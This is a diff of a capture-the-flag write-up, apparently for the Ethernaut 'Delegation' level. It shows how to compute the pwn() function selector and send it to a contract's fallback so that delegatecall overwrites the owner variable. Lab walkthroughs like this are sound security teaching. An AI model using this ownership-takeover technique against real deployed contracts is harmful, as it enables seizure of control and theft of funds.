@@ -12,15 +12,10 @@ To call a function via the lowlevel delegatecall function we must get the first 
 In the web console:
 - web3.utils.soliditySha3("pwn()") = 0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab
 
-Though we only want the first 4 bytes = 0xdd365b8b
-
 Then send a transaction to the fallback function of the contract passing the player account, contract address and the 4 bytes of the sha3 hash of the function:
 ```solidity
-    sendTransaction({
-        from: player,
-        to: contract.address,
-        data: "0xdd365b8b"
-    })
+    var pwnSig = web3.utils.sha3("pwn()") 
+    contract.sendTransaction({data: pwnSig})
 ```
 
 This will overwrite the owner variable of the Delegation contract:
